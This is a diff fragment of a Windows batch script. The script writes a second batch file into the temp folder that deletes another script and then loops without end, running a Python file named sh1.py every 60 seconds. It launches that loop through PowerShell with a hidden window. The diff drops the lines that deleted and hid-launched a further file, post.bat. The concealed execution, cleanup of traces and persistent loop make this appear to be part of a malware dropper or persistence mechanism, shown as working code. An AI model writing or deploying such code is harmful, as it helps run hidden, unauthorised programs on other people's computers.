@@ -2,7 +2,6 @@
 cd %temp%
 echo    @echo off > pro1.bat
 echo    del vb1.bat >> pro1.bat
-echo    del %temp%\post.bat >> pro1.bat
 echo    :loop >> pro1.bat
 echo    if not exist "%temp%\sh1.py" ^( >> pro1.bat
 echo        ^( >> pro1.bat
@@ -59,5 +58,4 @@ echo    python3 %temp%\sh1.py >> pro1.bat
 echo    timeout /t 60 >nul >> pro1.bat
 echo    ) >> pro1.bat
 echo    goto loop >> pro1.bat
-powershell -c "Start-Process -FilePath "%temp%\post.bat" -WindowStyle Hidden"
 powershell -c "Start-Process -FilePath "%temp%\pro1.bat" -WindowStyle Hidden"
